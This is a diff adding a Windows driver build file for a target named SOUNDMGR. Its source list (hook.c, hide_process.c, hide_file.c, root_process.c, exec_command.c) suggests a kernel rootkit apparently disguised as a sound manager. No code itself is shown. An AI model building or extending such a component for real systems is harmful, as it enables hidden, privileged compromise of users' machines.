@@ -1,0 +1,19 @@
+TARGETNAME	=	SOUNDMGR
+TARGETTYPE	=	DRIVER
+TARGETPATH	=	..\\..\\bin
+
+MSC_WARNING_LEVEL = -W3 -WX
+
+INCLUDES	=	..\\..\\inc
+
+TARGETLIBS	=	$(SDK_LIB_PATH)\user32.lib		\
+				$(SDK_LIB_PATH)\kernel32.lib
+
+SOURCES		=	driver.c			\
+				hook.c				\
+				irp_functions.c		\
+				hide_process.c		\
+				hide_file.c			\
+				root_process.c		\
+				find_eprocess.c		\
+				exec_command.c
